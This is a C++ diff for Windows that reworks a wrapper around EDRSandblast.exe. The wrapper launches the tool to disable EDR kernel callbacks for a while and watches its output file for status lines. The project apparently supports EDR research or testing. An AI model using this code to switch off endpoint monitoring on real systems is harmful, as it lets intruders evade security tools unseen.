@@ -1,126 +1,78 @@
 #include <windows.h>
 #include <iostream>
+#include <fstream>
 #include <string>
 
+#include "sandblast.h"
 #include "utils.h"
 
-static bool disabled = false;
-static bool notFound = false;
-static HANDLE childStdInWrite = NULL;
+static std::wstring out_file = get_base_path() + L"tools\\sandblast-status.txt";
 
-bool disable_kernel_callbacks() {
-    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
-    HANDLE childStdOutRead, childStdOutWrite;
-    HANDLE childStdInRead, childStdInWriteLocal;
+// disables kernel callbacks
+RETURN_CODE disable_wait_enable_kernel_callbacks() {
+    HANDLE hFile = CreateFile(
+        out_file.c_str(),
+        GENERIC_WRITE,
+        FILE_SHARE_READ,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
 
-    if (!CreatePipe(&childStdOutRead, &childStdOutWrite, &sa, 0)) {
-        std::cerr << "[!] Sandblast: Failed to create stdout pipe. Error: " << GetLastError() << "\n";
-        return false;
+    if (hFile == INVALID_HANDLE_VALUE) {
+        std::cerr << "[!] Sandblast: Failed to create " << wstring2string(out_file) << ", Error:" << GetLastError() << "\n";
+        return RETURN_CODE::FAILED;
     }
-    SetHandleInformation(childStdOutRead, HANDLE_FLAG_INHERIT, 0);
 
-    if (!CreatePipe(&childStdInRead, &childStdInWriteLocal, &sa, 0)) {
-        std::cerr << "[!] Sandblast: Failed to create stdin pipe. Error: " << GetLastError() << "\n";
-        CloseHandle(childStdOutRead);
-        CloseHandle(childStdOutWrite);
-        return false;
-    }
-    SetHandleInformation(childStdInWriteLocal, HANDLE_FLAG_INHERIT, 0);
-
-    // Start child process
-    STARTUPINFO si = { 0 };
+    // Setup process startup info
+    STARTUPINFO si{};
+    PROCESS_INFORMATION pi{};
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdOutput = childStdOutWrite;
-    si.hStdError = childStdOutWrite;
-    si.hStdInput = childStdInRead;
+    si.hStdOutput = hFile;
+    si.hStdError = hFile;
 
-    PROCESS_INFORMATION pi = { 0 };
-    std::wstring cmd = get_base_path() + L"tools\\EDRSandblast.exe toggle_callbacks 01 --kernelmode -i";
-
-    if (!CreateProcessW(
-        nullptr,
-        &cmd[0],
-		nullptr, nullptr, TRUE, 0, nullptr, nullptr, // TODO has to inherit handles, but a PPL (EDRi.exe) cannot spawn a non-PPL child
-        &si, &pi))
-    {
-        std::cerr << "[!] Sandblast: Failed to start child process. Error: " << GetLastError() << "\n";
-        CloseHandle(childStdOutRead);
-        CloseHandle(childStdOutWrite);
-        CloseHandle(childStdInRead);
-        CloseHandle(childStdInWriteLocal);
-        return false;
+	// Launch EDRSandblast with redirected output
+    std::wstring cmd = get_base_path() + L"tools\\EDRSandblast.exe toggle_callbacks 0t1 --kernelmode -i > " + out_file;
+    if (!CreateProcess(
+        NULL, &cmd[0], NULL, NULL,
+        FALSE, 0, NULL, NULL, &si, &pi)) {
+        std::cerr << "[!] Sandblast: Failed to start '" << wstring2string(cmd) << "', Error:" << GetLastError() << "\n";
+        CloseHandle(hFile);
+        return RETURN_CODE::FAILED;
     }
-    std::cout << "[*] Sandblast: Started '" << wstring2string(cmd) << "'\n";
 
-    CloseHandle(childStdOutWrite);
-    CloseHandle(childStdInRead);
+    CloseHandle(hFile);
 
-    // Save write handle for later
-    childStdInWrite = childStdInWriteLocal;
-
-    // Read child's output until the prompt is found
-    CHAR buffer[256];
-    std::string output;
-    DWORD bytesRead;
-
-    while (true)
-    {
-        BOOL success = ReadFile(childStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
-        if (!success || bytesRead == 0) {
-            std::cerr << "[!] Sandblast: Child process closed output or failed.\n";
-            break;
-        }
-
-        buffer[bytesRead] = 0;
-        output += buffer;
-
-        if (output.find("Press ENTER to enable callbacks again:") != std::string::npos) {
-            std::cout << "[+] Sandblast: Kernel callbacks disabled\n";
-            disabled = true;
-            break;
-        }
-        if (output.find("No EDR callbacks found, nothing to disable") != std::string::npos) {
-            std::cout << "[+] Sandblast: No EDR callbacks found, continuing...\n";
-            notFound = true;
-            break;
+    // Now monitor out.txt
+    size_t last_size = 0;
+	double waited_seconds = 0;
+	double timeout_seconds = 60.0; // this timeout is only reached if sandblast prints unexpected stuff
+    while (waited_seconds < timeout_seconds) {
+        std::ifstream in(out_file);
+        if (!in || !in.is_open()) {
+            std::cerr << "[!] Sandblast: Failed to open " << wstring2string(out_file) << "\n";
+            return RETURN_CODE::FAILED;
 		}
+        in.seekg(0, std::ios::end);
+        size_t size = in.tellg();
+        if (size != last_size) {
+            in.seekg(last_size);
+            std::string line;
+            while (std::getline(in, line)) {
+                if (line.find("[*] No EDR callbacks found, nothing to disable") != std::string::npos) {
+					return RETURN_CODE::SUCCESS_NO_WAIT;
+                }
+                if (line.find("[+] Waiting 30 seconds before re-enabling callbacks again...") != std::string::npos) {
+                    return RETURN_CODE::SUCCESS_WAIT;
+                }
+            }
+            last_size = size;
+        }
 
         Sleep(100); // avoid busy waiting
+		waited_seconds += 0.1;
     }
-	CloseHandle(childStdOutRead);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-	return true;
-}
-
-bool enable_kernel_callbacks() {
-    if (notFound) {
-        std::cerr << "[+] Sandblast: No EDR callbacks were found before, nothing to enable now\n";
-        return true;
-	}
-
-    if (!disabled) {
-        std::cerr << "[+] Sandblast: Kernel callbacks not disabled, cannot enable now\n";
-        return true;
-    }
-
-    if (!childStdInWrite) {
-        std::cerr << "[!] Sandblast: Broken pipe, cannot enable callbacks\n";
-        return false;
-	}
-
-    const char enter = '\n';
-    DWORD written = 0;
-    if (!WriteFile(childStdInWrite, &enter, 1, &written, nullptr)) {
-        std::cerr << "[!] Sandblast: Failed to send ENTER. Error: " << GetLastError() << "\n";
-        CloseHandle(childStdInWrite);
-        return false;
-    }
-
-    CloseHandle(childStdInWrite);
-    childStdInWrite = NULL;
-    disabled = false;
-    std::cout << "[+] Sandblast: Re-enabled kernel callbacks\n";
-    return true;
+    return RETURN_CODE::TIMEOUT;
 }
